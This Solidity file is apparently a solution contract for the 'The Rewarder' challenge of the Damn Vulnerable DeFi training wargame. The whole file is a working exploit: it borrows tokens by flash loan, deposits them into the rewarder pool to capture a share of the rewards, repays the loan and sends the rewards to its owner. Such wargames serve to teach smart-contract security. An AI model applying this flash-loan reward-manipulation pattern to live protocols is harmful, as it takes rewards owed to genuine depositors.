// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

import "../DamnValuableToken.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "./RewardToken.sol";

/**
 * @title TheRewarderAttackerContract
 */
contract TheRewarderAttackerContract {
    using Address for address;

    address private owner;
    FlashLoanerPool private pool;
    DamnValuableToken private token;
    TheRewarderPool private rewarder;
    RewardToken private rewardToken;

    constructor(
        address poolAddress,
        address liquidityToken,
        address rewarderPool,
        address rewardTokenAddress
    ) {
        owner = msg.sender;
        pool = FlashLoanerPool(poolAddress);
        token = DamnValuableToken(liquidityToken);
        rewarder = TheRewarderPool(rewarderPool);
        rewardToken = RewardToken(rewardTokenAddress);
    }

    function receiveFlashLoan(uint256 amount) external {
        token.approve(address(rewarder), amount);
        rewarder.deposit(amount);

        rewarder.withdraw(amount);

        // pay back flash loan
        token.transfer(address(pool), amount);
    }

    function attack(uint256 amount) external {
        pool.flashLoan(amount);

        // transfer rewards to attacker
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }

    receive() external payable {}
}
